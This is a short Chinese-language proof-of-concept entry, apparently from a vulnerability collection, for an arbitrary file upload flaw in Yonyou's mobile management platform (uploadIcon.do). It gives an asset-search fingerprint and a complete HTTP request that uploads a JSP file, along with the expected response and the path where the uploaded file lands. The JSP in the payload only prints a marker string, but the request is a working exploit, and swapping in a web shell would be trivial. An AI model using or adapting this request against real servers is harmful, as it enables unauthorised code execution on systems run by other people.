﻿# 用友移动管理平台uploadIcon任意文件上传

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="用友-移动系统管理"

> 验证脚本：HTTP

```
POST /maportal/appmanager/uploadIcon.do HTTP/1.1
Cache-Control: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Origin: chrome-extension://coohjcphdfgbiolnekdpbcijmhambjff
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96C92E0C800D0F301877F24A281C4630.server
Connection: close

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="iconFile"; filename="dudesuite.jsp"
Content-Type: application/msword

<% out.print("dudesuite"); %>
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```

> 响应代码特征：200

> 响应内容特征：status

> 上传文件定位：/maupload/img/dudesuite.jsp


> 验证文件来源：用友移动管理平台uploadIcon任意文件上传.poc
